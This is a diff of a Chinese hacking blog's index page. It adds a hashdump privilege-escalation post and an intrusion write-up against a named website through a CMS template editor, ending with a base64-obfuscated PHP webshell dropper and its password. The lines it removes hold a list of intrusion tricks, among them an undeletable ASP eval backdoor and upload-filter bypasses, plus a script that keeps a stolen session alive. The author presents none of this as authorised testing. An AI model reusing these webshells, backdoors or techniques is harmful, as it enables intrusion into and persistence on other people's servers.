@@ -74,6 +74,123 @@
 
    
     
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/08/06/记一次hashdump提权/" title="" itemprop="url"></a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-08-06T13:33:30.007Z" itemprop="datePublished"> 发表于 2018-08-06</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>提权的时候总能遇到无路可走的时候，有时候一个无意的举动就可能给你带来惊喜<br>这个服务器用了各种方法都没拿下了来 ，在实在没办法的时候运行了一下run hsahump,本来是没打算可以解密成功的，因为08的服务器因为组策略的原因导致弱口令非常少，所以我提的08当中，二十个都难遇一个弱口令这次遇到了，当然得详细记录了，嘿嘿<br>首先反弹一个shell到msf<br>然后运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://pcf9imvwz.sabkt.gdipper.com/3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>接着找到管理员的hash<br><img src="http://pcf9imvwz.sabkt.gdipper.com/4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>最后</p>
+<p><img src="http://pcf9imvwz.sabkt.gdipper.com/5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>登陆</p>
+<p><img src="http://pcf9imvwz.sabkt.gdipper.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/08/06/记一次曲折的搜搜!CMSgetshell/" title="" itemprop="url"></a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-08-06T12:59:22.235Z" itemprop="datePublished"> 发表于 2018-08-06</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>今天朋友丢了一个后台过来，说找不到可上传的地方。让我看看<br>1,首先登录后台看了一下，是搜搜!CMS，表示没听过emmmm,先去百度上搜索相关漏洞，发现毛都没有，有可能是小到不能在小的cms了<br><img src="http://pcf9imvwz.sabkt.gdipper.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>2,在后台逛了一下，发现模版这儿可以修改php文件，有意思<br><img src="http://pcf9imvwz.sabkt.gdipper.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>3,看一下这个页面是不是在根目录,明显不是<br><img src="http://pcf9imvwz.sabkt.gdipper.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>4,没有路径也白瞎，继续找吧，于是发现这个，那个蓝色的英文单词竟然和之前的对应，点击了一下，真的是唉<br><img src="http://pcf9imvwz.sabkt.gdipper.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>5,写一个一句话进去<br><img src="http://pcf9imvwz.sabkt.gdipper.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>6,解析了 ps(于是心里哼着小曲继续了，心想怎么那么简单的站还叫我拿)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>7,这是什么情况，已经排除了刀的问题，大马也没有，明明可以解析呀 (于是陷入沉思中。。。。。。)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>9,突然想起，我写的明明是news.php文件，但是打开时却在<a href="http://www.sdkhjn.com/page/news/index.php这是动态生成的页面吗，写个phpinfo()看一下路径" target="_blank" rel="noopener">http://www.sdkhjn.com/page/news/index.php这是动态生成的页面吗，写个phpinfo()看一下路径</a><br><img src="http://pcf9imvwz.sabkt.gdipper.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>10,如图：找到绝对路径<br><img src="http://pcf9imvwz.sabkt.gdipper.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>10,用php自定义写入马儿的路径(怕被杀，特意base64加密了一下,只要一执行这个文件，就会在定义的路径写入马儿)<br><img src="http://pcf9imvwz.sabkt.gdipper.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>11,果然的的猜想没错，菜刀直连<br><img src="http://pcf9imvwz.sabkt.gdipper.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>附上我用的那个马吧，密码BLUE<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$fp</span> = @fopen(<span class="string">"404.php"</span>, <span class="string">'w'</span>);</span><br><span class="line">@fwrite(<span class="variable">$fp</span>,base64_decode</span><br><span class="line">(<span class="string">'PD9waHANCmNsYXNzIGV2YWxzew0KICAgICAgICBwcm90ZWN0ZWQgJGxpbmtzOw0KICAgICAgICBmdW5j</span></span><br><span class="line"><span class="string">dGlvbiBfX2NvbnN0cnVjdCgkYW4pew0KICAgICAgICAgICAgICAgICR0aGlzLT5saW5rcyA9ICRhbjsNCi</span></span><br><span class="line"><span class="string">AgICAgICAgICAgICAgICBAZXZhbCgiXCR0aXRsZT0xOyIuJHRoaXMtPmxpbmtzKTsNCiAgICAgICAgfQ0K</span></span><br><span class="line"><span class="string">fQ0KJFdlYlNoZWxsID0gbmV3IGV2YWxzKEAkX1BPU1RbJ0JMVUUnXSk7DQo/Pg=='</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
     <article class="post-expand [layout]" itemprop="articleBody"> 
         <header class="article-info clearfix">
   <h1 itemprop="name">
@@ -284,7 +401,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/" title="windows下删除不掉文件夹：找不到该项目无法删除文件夹" itemprop="url">windows下删除不掉文件夹：找不到该项目无法删除文件夹</a>
+      <a href="/2018/04/03/Apache设置反向代理目录的方法/" title="Apache设置反向代理" itemprop="url">Apache设置反向代理</a>
   </h1>
   <p class="article-author">By
        
@@ -297,8 +414,14 @@
 </header>
     <div class="article-content">
         
-        <p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>
+        <p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p>
+<p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p>
+<p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p>
+<p>apache反向代理全站<br><code>`</code>bash</p>
+<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> 
+
+<p>apache反向代理二级目录 </p>
+<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> 
         
         
         <p class="article-more-link">
@@ -310,7 +433,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/windows7/">windows7</a>
+  <a class="article-category-link" href="/categories/SEO/">SEO</a>►<a class="article-category-link" href="/categories/SEO/反向代理/">反向代理</a>
 </div>
 
 
@@ -401,7 +524,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/04/03/Apache设置反向代理目录的方法/" title="Apache设置反向代理" itemprop="url">Apache设置反向代理</a>
+      <a href="/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/" title="windows下删除不掉文件夹：找不到该项目无法删除文件夹" itemprop="url">windows下删除不掉文件夹：找不到该项目无法删除文件夹</a>
   </h1>
   <p class="article-author">By
        
@@ -414,14 +537,8 @@
 </header>
     <div class="article-content">
         
-        <p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p>
-<p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p>
-<p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p>
-<p>apache反向代理全站<br><code>`</code>bash</p>
-<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> 
-
-<p>apache反向代理二级目录 </p>
-<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> 
+        <p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>
         
         
         <p class="article-more-link">
@@ -433,7 +550,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/SEO/">SEO</a>►<a class="article-category-link" href="/categories/SEO/反向代理/">反向代理</a>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/windows7/">windows7</a>
 </div>
 
 
@@ -666,144 +783,9 @@
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/02/28/渗透过程中总结的一些技巧/" title="PHP手工注入笔记" itemprop="url">PHP手工注入笔记</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-02-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-28</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>1.利用网站过滤不严直接绕过后台验证，在网站后面加上 admin/session.asp 或 admin/left.asp</p>
-<p>2.有的网站进后台会出现一个脚本提示框，输入：administrator 即可突破！因为admin代表以管理员身份进入的意思。</p>
-<p>3.有的网站开了3389，入侵之前先去连接3389，尝试弱口令或是爆破，再者就是按5次shift键，看看有没前人装过后门，然后再社工密码。</p>
-<p>4.有时候进后台会弹出提示框“请登陆”，把地址抄写出来（复制不了），然后放在网页源代码分析器里，选择浏览器-拦截跳转勾选–查看即可进入后台！</p>
-<p>5.突破防盗链访问webshell，代码：javascript:document.write(“<a href="http://www.xxx.com/uploadfile/1.asp" target="_blank" rel="noopener">fuck</a>“)  回车后点击GO即可进入webshell</p>
-<p>6.突破一流信息监控拦截系统访问，当小马可以访问，上传大马却不行的时候，可以先用大马跟一张图片合并，在上传合并后的图片，接着数据库备份后访问即可！</p>
-<p>7.在拿编辑器的shell时，有时增加了asp|asa|cer|php|aspx等扩展名上传时都被过滤了，其实只要增加aaspsp 上传asp就会突破了。</p>
-<p>8.有时啊D猜出表段了，但是猜不到字段的时候，可以到后台查看源文件，搜索ID或type，一般都能找到，再到啊D里添加字段进行猜解内容即可突破。</p>
-<p>9.社工后台密码可以用这个技巧，假如网站域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 管理员名称为admin，可以试试密码“baidu”和“baidu.com”来登陆。</p>
-<p>10.手工注入时如果网站过滤了 and 1=1   and 1=2 ，可以用xor 1=1   xor 1=2 进行判断。</p>
-<p>11.本地构造上传一句话木马，如果提示“请先选择你要上传的文件！[ 重新上传 ]” ，说明文件太小了，用记事本打开再复制多几句话从而扩大文件大小，再上传即可。</p>
-<p>12.用啊d跑表，跑字段名name和pass出不来，显示长度超过50什么的，猜解不出的情况下，这时放在穿山甲去跑一般都能跑出来！</p>
-<p>13.猜管理员后台小技巧，admin/left.asp、admin/main.asp、admin/top.asp、admin/admin.asp 会现出菜单导航，然后迅雷下载全部链接。</p>
-<p>14.知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句：Insert into admin(user,pwd) values(‘test’,’test’)</p>
-<p>15.当获得管理员密码，却拿不到管理员的帐号时，到前台随便打开一个新闻，找找诸如“提交者”“发布者”之类的字眼，一般“提交者”就是管理员的帐号了。</p>
-<p>16.爆破ASP+IIS架设的网站web绝对路径，假设网站主页为：<a href="http://www.xxxxx/index.asp/" target="_blank" rel="noopener">http://www.xxxxx/index.asp/</a> 提交<a href="http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。" target="_blank" rel="noopener">http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。</a></p>
-<p>17.源码的利用，很多网站用的都是网上下载的源码，有的站长很懒，什么也不改，然后就上传开通网站了，我们可以去下载一套，里面有很多默认的信息值得利用。</p>
-<p>18.把以下代码上传到webshell里，后缀是asp，就算别人发现了也删除不了，算是超级防删的一句话木马了，可以很安全的留个后门，菜刀连接密码：x<br>&lt;%Eval(Request(chr(120))):Set fso=CreateObject(“Scripting.FileSystemObject”):Set f=fso.GetFile(Request.ServerVariables(“PATH_TRANSLATED”)):if  f.attributes &lt;&gt; 39 then:f.attributes = 39:end if%&gt;</p>
-<p>19.当破解出帐号密码却找不到后台的时候，可以尝试链接ftp，假如域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> “ 得到的密码为“bishi”，我们就可以试下用“xxxx”“xxxx.cn”<a href="http://www.xxxx.cn作为FTP" target="_blank" rel="noopener">www.xxxx.cn作为FTP</a> 用户名，用“bishi”：作为FTP密码来进行登陆，成功的几率可以很大的哦！ftp的默认端口：21  默认帐号密码：test</p>
-<p>20.有的后台不显示验证码，难道就没法登录了么? 其实把一段代码导入注册表里就可以突破这个困境了，把下面的代码保存为Code.reg，双击导入就可以了！<br>REGEDIT4<br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security]<br>“BlockXBM”=dword:00000000</p>
-<p>21.当网站不允许上传 asp、asa、php等文件时，我们可以上传一个stm文件，代码为“<!--#include file=”conn.asp”-->”<br>  (想查看什么文件就写什么文件名，这里我假设想查看“conn.asp”)，然后直接打开这个stm文件的地址，再查看源代码，“conn.asp”这个文件的代码就一览无遗了！</p>
-<p>22.当网站不允许上传ASP,CGI,CER,CDX,HTR等类型的文件时，尝试上传一个shtm文件，内容为：<!--#includ file="conn.asp"--><br>如果上传成功，那太好了，访问地址就可以浏览conn.asp里的内容了，这样一来，数据库路径也就到手啦！</p>
-<p>23.手工检测注入点弹出“你的操作已被记录!”之类的信息，访问这个文件：sqlin.asp，如果存在，在注入点后面植入一句话木马：‘excute(request(“TNT”))<br>接着用一句话木马客户端连接：<a href="http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。" target="_blank" rel="noopener">http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。</a></p>
-<p>24.旁注的话，肯定是挑支持aspx的站点来日了，问题是怎样判断呢？方法很简单，在在网站后面加上xxx.aspx，如果返回“/”应用程序中的服务器错误，无法找到该资源，404画面就说明支持aspx木马。</p>
-<p>25.网站后面加test.php 可以查看版本</p>
-<p>26.禁忌这两个网站后台文件 admin_index.asp  manage_login.asp<br>总结：当然啦，这些还不太全，慢慢补上</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/02/27/保证session不被服务器因超时注销/" title="即可保证session不被服务器因超时注销" itemprop="url">即可保证session不被服务器因超时注销</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
   </nav>
 
 </div>
@@ -819,7 +801,7 @@
   
 <div class="category-block">
   <h3 class="asidetitle">分类</h3>
-     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">11</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">38</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/上传/">上传</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span 